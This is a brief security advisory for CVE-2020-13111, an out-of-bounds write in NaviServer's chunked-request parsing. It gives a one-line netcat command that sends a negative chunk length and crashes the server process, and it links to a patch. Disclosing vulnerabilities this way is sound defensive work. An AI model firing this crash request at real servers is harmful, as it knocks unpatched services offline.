# CVE-2020-13111: Out-of-bounds write in NaviServer

NaviServer [1] 4.99.4 to 4.99.19 mishandles parsing and validation of chunk lengths in the function `ChunkedDecode` in `driver.c`  This will result in a negative value being passed to memmove via the `size` parameter, causing a huge copy to hit an unmapped page, so called wild copy [2] and termination of the `nsd` process.

The following request is used to reproduce this issue:

```
echo -e "POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n-1\r\nchunk\r\n0\r\n\r\n" | nc localhost 8080
```

Patch is available in [3].

## References 

[1] NaviServer - https://sourceforge.net/projects/naviserver/

[2] Google Project Zero: Taming the wild copy: Parallel Thread Corruption - https://googleprojectzero.blogspot.com/2015/03/taming-wild-copy-parallel-thread.html

[3] Patch - https://bitbucket.org/naviserver/naviserver/commits/a5c3079f1d8996d5f34c9384a440acf3519ca3bb
